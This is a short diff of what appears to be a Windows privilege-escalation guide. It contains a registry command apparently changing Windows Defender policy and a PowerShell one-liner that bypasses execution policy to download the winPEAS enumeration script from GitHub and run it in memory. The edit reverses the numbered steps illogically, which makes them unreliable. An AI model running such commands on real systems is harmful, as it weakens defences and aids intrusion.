@@ -8,8 +8,7 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 
 
 
-
-1. Downloading the winPEAS.ps1 script from its GitHub repository.
-2. Executing that script immediately. Run the following script.
+1. Executing that script immediately.
+2. Downloading the winPEAS.ps1 script from its GitHub repository.
    
 powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') | IEX"
